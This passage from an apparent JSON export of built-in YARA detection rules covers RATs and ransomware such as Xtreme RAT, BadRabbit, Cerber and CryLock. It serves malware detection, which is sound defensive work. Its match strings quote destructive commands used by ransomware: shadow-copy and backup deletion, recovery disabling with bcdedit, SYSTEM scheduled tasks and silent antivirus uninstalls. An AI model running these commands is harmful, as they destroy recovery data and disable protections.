vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter (with combination of work from Kevin Breen)\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"Xtreme\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $s1 = \"XTREME\" wide\n        $s2 = \"XTREMEBINDER\" wide\n        $s3 = \"DVCLAL\" wide\n        $s4 = \"PACKAGEINFO\" wide\n        $s5 = \"XTREMEUPDATE\" wide\n        $a1 = \"XTREME\" wide\n        $a2 = \"ServerStarted\" wide\n        $a3 = \"XtremeKeylogger\" wide\n        $a4 = \"x.html\" wide\n        $a5 = \"Xtreme RAT\" wide\n\n    condition:\n        all of ($s*) or all of ($a*)\n}\n\nrule Xtreme_\n{\n    meta:\n        description = \"Xtreme RAT\"\n        ref = \"http://malwareconfig.com/stats/Xtreme\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"XtremeRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_Xtreme\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = \"XTREME\" wide\n        $b = \"ServerStarted\" wide\n        $c = \"XtremeKeylogger\" wide\n        $d = \"x.html\" wide\n        $e = \"Xtreme RAT\" wide\n\n    condition:\n        all of them\n}\n\nrule Xtreme_Sep17_1\n{\n    meta:\n        description = \"Xtreme RAT\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"XtremeRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Xtreme_Sep17_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"ServerKeyloggerU\" fullword ascii\n        $x2 = \"TServerKeylogger\" fullword ascii\n        $x3 = \"XtremeKeylogger\" fullword wide\n        $x4 = \"XTREMEBINDER\" fullword wide\n        $s1 = \"shellexecute=\" fullword wide\n        $s2 = \"[Execute]\" fullword wide\n        $s3 = \";open=RECYCLER\\\\S-1-5-21-1482476501-3352491937-682996330-1013\\\\\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 4000KB and (pe.imphash() == \"735af2a144f62c50ba8e89c1c59764eb\" or (1 of ($x*) or 3 of them))\n}\n\nrule Xtreme_Sep17_2\n{\n    meta:\n        description = \"Xtreme RAT\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"XtremeRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Xtreme_Sep17_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Spy24.exe\" fullword wide\n        $s2 = \"Remote Service Application\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 3000KB and all of them)\n}\n\nrule Xtreme_Sep17_3\n{\n    meta:\n        description = \"Xtreme RAT\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"XtremeRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Xtreme_Sep17_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"Keylogg\" fullword ascii\n        $s4 = \"XTREME\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 700KB and all of them)\n}\n\nrule Xtreme_RAT_Gen_Imp\n{\n    meta:\n        description = \"Xtreme RAT\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"XtremeRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Xtreme_RAT_Gen_Imp\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and (pe.imphash() == \"d0bdf112886f3d846cc7780967d8efb9\" or pe.imphash() == \"cc6f630f214cf890e63e899d8ebabba6\" or pe.imphash() == \"e0f7991d50ceee521d7190effa3c494e\")\n}\n\nrule zoxPNG_RAT\n{\n    meta:\n        description = \"ZoxPNG RAT\"\n        ref = \"http://www.novetta.com/wp-content/uploads/2014/11/ZoxPNG.pdf\"\n        classifications = \"Backdoor\"\n        threat_names = \"ZoxPNG\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Novetta Advanced Research Group\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"zoxPNG_RAT\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $url = \"png&w=800&h=600&ei=CnJcUcSBL4rFkQX444HYCw&zoom=1&ved=1t:3588,r:1,s:0,i:92&iact=rc&dur=368&page=1&tbnh=184&tbnw=259&start=0&ndsp=20&tx=114&ty=58\"\n\n    condition:\n        $url\n}",
      "send_mail": false,
      "shareable": true
    },
    "11": {
      "builtin": true,
      "builtin_name": "Ransomware",
      "created": "2020-05-10 14:25:02.654965",
      "id": 11,
      "modified": "2020-08-27 12:53:30.401284",
      "name": "Ransomware",
      "owner_user_id": null,
      "rules": "import \"math\"\nimport \"pe\"\n\nrule legion_777\n{\n    meta:\n        description = \".777 ransomware (UPX-unpacked)\"\n        ref = \"https://github.com/Daxda/malware-analysis/tree/master/malware_samples/legion\"\n        classifications = \"Ransomware\"\n        threat_names = \".777\"\n        author = \"Daxda (https://github.com/Daxda)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"legion_777\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"http://tuginsaat.com/wp-content/themes/twentythirteen/stats.php\"\n        $s2 = \"read_this_file.txt\" wide\n        $s3 = \"seven_legion@india.com\"\n        $s4 = {46 4f 52 20 44 45 43 52 59 50 54 20 46 49 4c 45 53 0d 0a 53 45 4e 44 20 4f\n               4e 45 20 46 49 4c 45 20 49 4e 20 45 2d 4d 41 49 4c 0d 0a 73 65 76 65 6e 5f\n               6c 65 67 69 6f 6e 40 69 6e 64 69 61 2e 63 6f 6d }\n        $s5 = \"%s._%02i-%02i-%02i-%02i-%02i-%02i_$%s$.777\"\n\n    condition:\n        4 of ($s*)\n}\n\nrule Ransom_Alpha\n{\n    meta:\n        description = \"Alpha ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Alpha\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"CCN-CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Ransom_Alpha\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = { 52 00 65 00 61 00 64 00 20 00 4D 00 65 00 20 00 28 00 48 00 6F 00 77 00 20 00 44 00 65 00 63 }\n\n    condition:\n        $a\n}\n\nrule Ransom_Alfa\n{\n    meta:\n        description = \"Alpha ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Alpha\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"CCN-CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Ransom_Alfa\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = { 8B 0C 97 81 E1 FF FF 00 00 81 F9 19 04 00 00 74 0F 81 F9 }\n        $b = { 22 04 00 00 74 07 42 3B D0 7C E2 EB 02 }\n\n    condition:\n        all of them\n}\n\nrule anubi\n{\n    meta:\n        description = \"Anubi ransomware\"\n        ref = \"https://www.bleepingcomputer.com/news/security/new-anubi-ransomware-in-the-wild/\"\n        classifications = \"Ransomware\"\n        threat_names = \"Anubi\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"TJ Nelson (@REonFleek)\"\n        source = \"https://github.com/tjnel/yara_repo\"\n        original_name = \"anubi\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $av0 = \"/c \\\"wmic product where name=\\\"ESET NOD32 Antivirus\\\" call uninstall /nointeractive \\\"\"\n        $av1 = \"/c \\\"wmic product where name=\\\"Kaspersky Anti-Virus\\\" call uninstall /nointeractive \\\"\"\n        $av2 = \"/c \\\"wmic product where name=\\\"Kaspersky Internet Security\\\" call uninstall /nointeractive \\\"\"\n        $av3 = \"/c \\\"wmic product where name=\\\"Avira Connect\\\" call uninstall /nointeractive \\\"\"\n        $av4 = \"SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Reporting\"\n        $cmd0 = \"Invmod of %d %% %d\"\n        $cmd1 = \"Expected : %d\"\n        $cmd2 = \"Result :\"\n        $cmd3 = \"%08X%08X%c\"\n        $anti0 = \"DisableAntiSpyware\"\n        $anti1 = \"DisableRoutinelyTakingAction\"\n        $anti2 = \"TaskbarNoNotification\"\n        $anti3 = \"DisableNotificationCenter\"\n        $ransom0 = \"Dele\"\n        $ransom1 = \"te S\"\n        $ransom2 = \"hado\"\n        $ransom3 = \"ws /\"\n        $ransom4 = \"All\"\n        $ransom5 = \"/Qui\"\n        $ransom6 = \"et &\"\n\n    condition:\n        (uint16(0) == 0x5A4D) and (2 of ($av*)) and (3 of ($cmd*)) and (3 of ($anti*)) and (6 of ($ransom*))\n}\n\nrule BadRabbit_Gen\n{\n    meta:\n        description = \"BadRabbit Ransomware\"\n        ref = \"https://pastebin.com/Y7pJv3tK\"\n        classifications = \"Ransomware\"\n        threat_names = \"BadRabbit\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"BadRabbit_Gen\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"schtasks /Create /SC ONCE /TN viserion_%u /RU SYSTEM /TR \\\"%ws\\\" /ST\" fullword wide\n        $x2 = \"schtasks /Create /RU SYSTEM /SC ONSTART /TN rhaegal /TR \\\"%ws /C Start \\\\\\\"\\\\\\\" \\\\\\\"%wsdispci.exe\\\\\\\"\" fullword wide\n        $x3 = \"C:\\\\Windows\\\\infpub.dat\" fullword wide\n        $x4 = \"C:\\\\Windows\\\\cscc.dat\" fullword wide\n        $s1 = \"need to do is submit the payment and get the decryption password.\" fullword ascii\n        $s2 = \"\\\\\\\\.\\\\GLOBALROOT\\\\ArcName\\\\multi(0)disk(0)rdisk(0)partition(1)\" fullword wide\n        $s3 = \"\\\\\\\\.\\\\pipe\\\\%ws\" fullword wide\n        $s4 = \"fsutil usn deletejournal /D %c:\" fullword wide\n        $s5 = \"Run DECRYPT app at your desktop after system boot\" fullword ascii\n        $s6 = \"Files decryption completed\" fullword wide\n        $s7 = \"Disable your anti-virus and anti-malware programs\" fullword wide\n        $s8 = \"SYSTEM\\\\CurrentControlSet\\\\services\\\\%ws\" fullword wide\n        $s9 = \"process call create \\\"C:\\\\Windows\\\\System32\\\\rundll32.exe\" fullword wide\n        $s10 = \"%ws C:\\\\Windows\\\\%ws,#1 %ws\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 700KB and (1 of ($x*) or 2 of them)\n}\n\nrule BadRabbit\n{\n    meta:\n        description = \"BadRabbit\"\n        classifications = \"Ransomware\"\n        threat_names = \"BadRabbit\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"grotezinfosec\"\n        source = \"https://github.com/MrThreat/yararules\"\n        original_name = \"BadRabbit\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $string0 = \"C89S(u\"\n        $string1 = \"Ri(czO\"\n        $string2 = \"DV.{/y\"\n        $string3 = \"111111111,,,,,,\"\n        $string4 = \"wkPSQR\"\n        $string5 = \"RjIOc/\"\n        $string6 = \"111111,\"\n        $string7 = \"11N_KW\\\\s\"\n        $string8 = \"1(c) 2008 VeriSign, Inc. - For authorized use only1806\"\n        $string9 = \"{nr{La\"\n        $string10 = \"\\\\LY20M\"\n        $string11 = \",,,,,,\"\n        $string12 = \"PR0uLK\"\n        $string13 = \" Player Installer/Uninstaller\" wide\n        $string14 = \"mk-kko\"\n        $string15 = \"0F0b0s0z0\"\n        $string16 = \",Symantec Class 3 SHA256 Code Signing CA - G2\"\n        $string17 = \"w(<6p3x0\"\n        $string18 = \"http://sf.symcb.com/sf.crl0W\"\n\n    condition:\n        18 of them\n}\n\nrule sig_8ebc97e05c8e1073bda2efb6f4d00ad7e789260afa2c276f0c72740b838a0a93\n{\n    meta:\n        description = \"Bad Rabbit Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"BadRabbit\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Christiaan Beek\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"sig_8ebc97e05c8e1073bda2efb6f4d00ad7e789260afa2c276f0c72740b838a0a93\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"schtasks /Create /SC ONCE /TN viserion_%u /RU SYSTEM /TR \\\"%ws\\\" /ST %02d:%02d:00\" fullword wide\n        $x2 = \"need to do is submit the payment and get the decryption password.\" fullword ascii\n        $s3 = \"If you have already got the password, please enter it below.\" fullword ascii\n        $s4 = \"dispci.exe\" fullword wide\n        $s5 = \"\\\\\\\\.\\\\GLOBALROOT\\\\ArcName\\\\multi(0)disk(0)rdisk(0)partition(1)\" fullword wide\n        $s6 = \"Run DECRYPT app at your desktop after system boot\" fullword ascii\n        $s7 = \"Enter password#1: \" fullword wide\n        $s8 = \"Enter password#2: \" fullword wide\n        $s9 = \"C:\\\\Windows\\\\cscc.dat\" fullword wide\n        $s10 = \"schtasks /Delete /F /TN %ws\" fullword wide\n        $s11 = \"Password#1: \" fullword ascii\n        $s12 = \"\\\\AppData\" fullword wide\n        $s13 = \"Readme.txt\" fullword wide\n        $s14 = \"Disk decryption completed\" fullword wide\n        $s15 = \"Files decryption completed\" fullword wide\n        $s16 = \"http://diskcryptor.net/\" fullword wide\n        $s17 = \"Your personal installation key#1:\" fullword ascii\n        $s18 = \".3ds.7z.accdb.ai.asm.asp.aspx.avhd.back.bak.bmp.brw.c.cab.cc.cer.cfg.conf.cpp.crt.cs.ctl.cxx.dbf.der.dib.disk.djvu.doc.docx.dwg.\" wide\n        $s19 = \"Disable your anti-virus and anti-malware programs\" fullword wide\n        $s20 = \"bootable partition not mounted\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and pe.imphash() == \"94f57453c539227031b918edd52fc7f1\" and (1 of ($x*) or 4 of them)) or (all of them)\n}\n\nrule BB_Ransomware\n{\n    meta:\n        description = \"BB Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"BB Ransomware\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $id1 = \"BB ransomware\" wide ascii\n        $id2 = \".encryptedbyBB\" wide ascii\n\n        $o1 = \"Wait... Payment is checking\" wide ascii\n        $o2 = \"Hello! I'm a BB\" wide ascii\n        $o3 = \"Decrypt file\" wide ascii\n        $o4 = \"special decrypt code\" wide ascii\n        $o5 = \"Enter code: \" wide ascii\n        $o6 = \"Wrong code. Hahaha\" wide ascii\n        $o7 = \"Microsoft.VisualBasic.dll\" wide ascii\n        $o8 = \"System.Windows.Forms.dll\" wide ascii\n\n    condition:\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and 1 of ($id*)\n        and 5 of ($o*)\n}\n\nrule cerber3\n{\n    meta:\n        description = \"Cerber ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Cerber\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"pekeinfo\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"cerber3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = {00 6A 00 68 80 00 00 00 6A 03 6A 00 6A 03 6A  01 8B 85}\n        $b = {68 3B DB 00 00 ?? ?? ?? ?? 00 ?? FF 15}\n\n    condition:\n        1 of them\n}\n\nrule cerber4\n{\n    meta:\n        description = \"Cerber ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Cerber\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"pekeinfo\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"cerber4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = {8B 0D ?? ?? 43 00 51 8B 15 ?? ?? 43 00 52 E8 C9 04 00 00 83 C4 08 89 45 FC A1 ?? ?? 43 00 3B 05 ?? ?? 43 00 72 02}\n\n    condition:\n        1 of them\n}\n\nrule cerber5\n{\n    meta:\n        description = \"Cerber ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Cerber\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"pekeinfo\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"cerber5\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = {83 C4 04 A3 ?? ?? ?? 00 C7 45 ?? ?? ?? ?? 00 8B ?? ?? C6 0? 56 8B ?? ?? 5? 68 ?? ?? 4? 00 FF 15 ?? ?? 4? 00 50 FF 15 ?? ?? 4? 00 A3 ?? ?? 4? 00 68 1D 10 00 00 E8 ?? ?? FF FF 83 C4 04 ?? ?? ??}\n\n    condition:\n        1 of them\n}\n\nrule cerber5b\n{\n    meta:\n        description = \"Cerber ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Cerber\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"pekeinfo\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"cerber5b\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = {8B ?? ?8 ?? 4? 00 83 E? 02 89 ?? ?8 ?? 4? 00 68 ?C ?9 4? 00 [0-6] ?? ?? ?? ?? ?? ?8 ?? 4? 00 5? FF 15 ?? ?9 4? 00 89 45 ?4 83 7D ?4 00 75 02 EB 12 8B ?? ?0 83 C? 06 89 ?? ?0 B? DD 03 00 00 85}\n\n    condition:\n        $a\n}\n\nrule ransomware_windows_cerber_evasion\n{\n    meta:\n        description = \"Cerber ransomware\"\n        ref = \"http://www.darkreading.com/vulnerabilities---threats/cerber-ransomware-now-evades-machine-learning/d/d-id/1328506, http://blog.trendmicro.com/trendlabs-security-intelligence/cerber-starts-evading-machine-learning/\"\n        classifications = \"Ransomware\"\n        threat_names = \"Cerber\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@fusionrace\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"ransomware_windows_cerber_evasion\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $s1 = \"38oDr5.vbs\" fullword ascii wide\n        $s2 = \"8ivq.dll\" fullword ascii wide\n        $s3 = \"jmsctls_progress32\" fullword ascii wide\n\n    condition:\n        all of them\n}\n\nrule ammyy_cerber3\n{\n    meta:\n        description = \"Cerber ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Cerber\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Rich Walchuck\"\n        source = \"https://github.com/tenable/yara-rules\"\n        original_name = \"ammyy_cerber3\"\n        license = \"BSD-3-Clause (https://opensource.org/licenses/BSD-3-Clause)\"\n\n    strings:\n        $s0 = \"mailto:support@ammy.com\" fullword ascii\n        $s1 = \"@$&%04\\\\Uninstall.exe\" fullword ascii\n        $s2 = \"@$&%05\\\\encrypted.exe\" fullword ascii\n        $s3 = \"http://www.ammy.com/\" fullword ascii\n        $s4 = \"@$&%05\\\\AA_v3.exe\" fullword ascii\n        $s5 = \"ammy 1.00 - Smart Install Maker\" fullword ascii\n        $s6 = \"ammy 1.00 Installation\" fullword wide\n        $s7 = \"Ammy\" fullword wide\n\n    condition:\n        all of them\n}\n\nprivate rule CryLock_Binary\n{\n    strings:\n        $delphi = \"Software\\\\Borland\\\\Delphi\\\\Locales\"\n\n        $com1 = \"vssadmin delete shadows /all /quiet\"\n        $com2 = \"wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0\"\n        $com3 = \"wbadmin DELETE BACKUP -keepVersions:0\"\n        $com4 = \"wmic SHADOWCOPY DELETE\"\n        $com5 = \"bcdedit /set {default} recoveryenabled No\"\n        $com6 = \"bcdedit /set {default} bootstatuspolicy ignoreallfailures\"\n\n        $conf1 = \"///END COMMANDS LIST\\\\\\\\\\\\\"\n        $conf2 = \"///END PROCESSES WHITE LIST\\\\\\\\\\\\\"\n        $conf3 = \"///END UNENCRYPT EXTENATIONS\\\\\\\\\\\\\"\n        $conf4 = \"///END ENCRYPT ONLY EXTENATIONS\\\\\\\\\\\\\"\n\n        $c1 = \"delete\"\n        $c2 = \"shutdown\"\n        $c3 = \"-f -s -t 00\"\n        $c4 = \"infinity\"\n        $c5 = \"/c \\\"ping 0.0.0.0&del \\\"\"\n\n        $rn1 = \"applicationname=\\\"CryLock\\\"\"\n        $rn2 = \"<title>CryLock</title>\"\n        $rn3 = \"'<%UNDECRYPT_DATETIME%>'\"\n        $rn4 = \"'<%MAIN_CONTACT%>'\"\n        $rn5 = \"'<%RESERVE_CONTACT%>')\"\n        $rn6 = \"'[<%HID%>]'\"\n        \n    condition:\n        // Memory dump or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and $delphi\n        and 3 of ($com*)\n        and 2 of ($conf*)\n        and 1 of ($c*)\n        and 2 of ($rn*)\n}\n\nprivate rule CryLock_FuncStrings\n{\n    strings:\n        $delphi = \"Software\\\\Borland\\\\Delphi\\\\Locales\"\n\n        $com1 = \"vssadmin delete shadows /all /quiet\"\n        $com2 = \"wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0\"\n        $com3 = \"wbadmin DELETE BACKUP -keepVersions:0\"\n        $com4 = \"wmic SHADOWCOPY DELETE\"\n        $com5 = \"bcdedit /set {default} recoveryenabled No\"\n        $com6 = \"bcdedit /set {default} bootstatuspolicy ignoreallfailures\"\n\n        $ext1 = \"[sel3].[\"\n        $ext2 = \"[sel4].[\"\n\n    condition:\n        // Function string file\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n        )\n        and $delphi\n        and 3 of ($com*)\n        and 1 of ($ext*)\n}\n\nrule CryLock_RansomNote\n{\n    meta:\n        description = \"CryLock Ransom Note\"\n        classifications = \"Ransomware\"\n        threat_names = \"CryLock\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n        \n    strings:\n        $n1 = \"<title>CryLock</title>\"\n        $n2 = \"applicationname=\\\"CryLock\\\"\"\n        $o1 = \"<hta:application\"\n        $o2 = \"<font color=\\\"red\\\" size=\\\"5\\\"><b>Price is raised!</b></font>\"\n        $o4 = \"<font color=\\\"red\\\" size=\\\"5\\\"><b>Last chance to decrypt your files!</b></font>\"\n        $o5 = \"<b>'+dd+' '+hh+':'+mm+':'+ss+'</b>\"\n        $o6 = \"<font face=\\\"monospace\\\" color=\\\"#c2c2c2\\\" size=\\\"4\\\">-- days --:--:--</font>\"\n\n    condition:\n        1 of ($n*)\n        and 3 of ($o*)\n}\n\nrule CryLock\n{\n    meta:\n        description = \"CryLock Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"CryLock\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    condition:\n        CryLock_FuncStrings or CryLock_Binary\n}\n\nrule CryptoLocker_set1\n{\n    meta:\n        description = \"CryptoLocker ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"CryptoLocker\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Christiaan Beek, Christiaan_Beek@McAfee.com\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"CryptoLocker_set1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $string0 = \"static\"\n        $string1 = \" kscdS\"\n        $string2 = \"Romantic\"\n        $string3 = \"CompanyName\" wide\n        $string4 = \"ProductVersion\" wide\n        $string5 = \"9%9R9f9q9\"\n        $string6 = \"IDR_VERSION1\" wide\n        $string7 = \"  </trustInfo>\"\n        $string8 = \"LookFor\" wide\n        $string9 = \":n;t;y;\"\n        $string10 = \"        <requestedExecutionLevel level\"\n        $string11 = \"VS_VERSION_INFO\" wide\n        $string12 = \"2.0.1.0\" wide\n        $string13 = \"<assembly xmlns\"\n        $string14 = \"  <trustInfo xmlns\"\n        $string15 = \"srtWd@@\"\n        $string16 = \"515]5z5\"\n        $string17 = \"C:\\\\lZbvnoVe.exe\" wide\n\n    condition:\n        12 of ($string*)\n}\n\nrule CryptoLocker_rule2\n{\n    meta:\n        description = \"CryptoLocker ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"CryptoLocker\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Christiaan Beek, Christiaan_Beek@McAfee.com\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"CryptoLocker_rule2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $string0 = \"2.0.1.7\" wide\n        $string1 = \"    <security>\"\n        $string2 = \"Romantic\"\n        $string3 = \"ProductVersion\" wide\n        $string4 = \"9%9R9f9q9\"\n        $string5 = \"IDR_VERSION1\" wide\n        $string6 = \"button\"\n        $string7 = \"    </security>\"\n        $string8 = \"VFileInfo\" wide\n        $string9 = \"LookFor\" wide\n        $string10 = \"      </requestedPrivileges>\"\n        $string11 = \" uiAccess\"\n        $string12 = \"  <trustInfo xmlns\"\n        $string13 = \"last.inf\"\n        $string14 = \" manifestVersion\"\n        $string15 = \"FFFF04E3\" wide\n        $string16 = \"3,31363H3P3m3u3z3\"\n\n    condition:\n        12 of ($string*)\n}\n\nrule BackdoorFCKG : CTB_Locker_Ransomware\n{\n    meta:\n        description = \"CTB-Locker ransomware\"\n        ref = \"https://blogs.mcafee.com/mcafee-labs/rise-backdoor-fckq-ctb-locker\"\n        classifications = \"Ransomware\"\n        threat_names = \"CryptoLocker\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"ISG\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"BackdoorFCKG\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $string0 = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n        $stringl = 